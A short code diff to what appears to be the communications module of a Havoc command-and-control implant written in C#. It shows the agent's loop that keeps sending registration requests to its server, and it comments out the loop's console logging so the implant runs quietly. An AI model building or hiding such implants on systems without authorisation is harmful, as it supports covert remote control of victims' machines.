@@ -25,9 +25,9 @@ namespace HavocImplant.Communications
             string response = "";
             while (!response.Equals("registered"))
             {
-                Console.WriteLine("Trying to register");
+                //Console.WriteLine("Trying to register");
                 response = Encoding.UTF8.GetString(SendReq(registrationRequestBody, agentHeader));
-                Console.WriteLine("Response: {0}", response);
+                //Console.WriteLine("Response: {0}", response);
                 Thread.Sleep(agent.sleepTime);
             }
             agent.registered = true;
